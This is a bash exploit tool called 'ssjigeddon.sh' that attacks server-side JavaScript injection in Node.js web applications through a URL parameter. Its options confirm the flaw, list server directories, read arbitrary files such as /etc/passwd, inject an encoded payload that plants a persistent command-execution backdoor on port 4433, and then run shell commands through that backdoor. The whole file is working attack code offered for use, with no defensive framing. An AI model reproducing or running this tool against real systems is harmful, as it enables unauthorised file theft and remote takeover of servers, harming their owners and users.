#!/bin/bash

if [[ $2 == "check" ]]; then
	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
	text="899d674da5e5299281ff3fbd2865f576"
	payload=$(echo 'res.end(%22'$text'%22)')
	target=$(echo $1 | sed "s/SSJI/$payload/g")
	result=$(curl -si $target)
	if [[ $result == *$text ]]; then
		echo -e "RESULT:\t\tVULNERABLE! :)\n"
	else
		echo -e "RESULT:\t\tNo vulnerable :(\n"
	fi

elif [[ $2 == "dir" ]]; then
	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
	payload_dir=$(echo "res.send(require(\"fs\").readdirSync(\""$3"\").toString())")
	url_cut_dir=$(echo $1 | sed "s/SSJI/\n/g")
	result_dir=$(curl -s $url_cut_dir$payload_dir)
	echo -e "RESULT:"
	if [[ $result_dir == *"Error:"* ]]; then
	    echo -e "\nThe specified directory does not exist or access to it is not allowed.\n"
    else
	    echo -e "\n$result_dir" | sed "s/,/\n/g"
	    echo -e ""
    fi

elif [[ $2 == "view" ]]; then
	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
	payload_view=$(echo "res.end(require(\"fs\").readFileSync(\""$3"\"))")
	url_cut_view=$(echo $1 | sed "s/SSJI/\n/g")
	result_view=$(curl -s $url_cut_view$payload_view)
	echo -e "RESULT:"
	if [[ $result_view == *"Error:"* ]]; then
	    echo -e "\nThe indicated file does not exist or access to it is not allowed.\n"
    else
	    echo -e "\n$result_view"
	    echo -e ""
    fi

elif [[ $2 == "backdoor" ]]; then
	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
	payload_backdoor=$(echo "(function%20x()%7Brequire(%27http%27).createServer(function(req%2Cres)%7Bres.writeHead(200%2C%7B%22Content-Type%22%3A%22text%2Fplain%22%7D)%3Brequire(%27child_process%27).exec(require(%27url%27).parse(req.url%2Ctrue).query%5B%27cmd%27%5D%2Cfunction(e%2Cs%2Cst)%7Bres.end(s)%7D)%7D).listen(4433)%7D)()")
	url_cut_backdoor=$(echo $1 | sed "s/SSJI/\n/g")
	url_backdoor=$(echo $1 | cut -d "?" -f1 | cut -d ":" -f1-2)":4433/?cmd=pwd"
	result_backdoor=$(curl -s $url_backdoor)
	echo -e "RESULT:"
	if [[ $result_backdoor == "" ]]; then
	    curl -s $url_cut_backdoor$payload_backdoor >/dev/null
	    echo -e "\nCongratulations! You have successfully generated a backdoor!\n"
    else
        echo -e "\nYou already have a previously generated backdoor. Please run the option \"cmd\" + 'command'.\n"
    fi

elif [[ $2 == "cmd" ]]; then
	echo -e "\nTARGET:\t\t[ "$(echo $1 | cut -d "/" -f3)" ]"
	echo -e "PARAMETER:\t[ "$(echo $1 | cut -d "?" -f2 | sed "s/&/\n/g" | grep "SSJI" | cut -d "=" -f1)" ]"
	url_cut_cmd=$(echo $1 | sed "s/SSJI/\n/g")
	command=$(echo $3 | sed "s/ /\+/g")
	url_cmd=$(echo $1 | cut -d "?" -f1 | cut -d ":" -f1-2)":4433/?cmd="$command
	result_cmd=$(curl -s $url_cmd)
	echo -e "RESULT:"
	if [[ $result_cmd == "" ]]; then
	    echo -e "\nAn error has occurred. It was not possible to connect to the generated backdoor.\n"
    else
	    echo -e "\n$result_cmd"
	    echo -e ""
    fi

elif [[ $2 == "" ]]; then
	echo -e "\nUsage:\tbash ssjigeddon.sh [options] [resource]\n";
	echo -e "Options:";
	echo -e "      check      Check if the host is vulnerable to this security flaw.";
	echo -e "                 Validation via payload: <<res.end('text')>>.";
	echo -e "      dir        List of files and directories.";
	echo -e "                 As a resource you must indicate the path (example: /var/).";
	echo -e "      view       View of file contents.";
	echo -e "                 As a resource you must indicate the file you want to read (example: /etc/passwd).";
	echo -e "      backdoor   Generates a backdoor in the target.";
	echo -e "                 Through the same process (nodejs) an application is generated on port 4433.";
	echo -e "      cmd        Using the previously generated backdoor, it allows you to execute commands on the system.";
	echo -e "                 As a resource, be sure to indicate the command you want to execute.\n";
fi
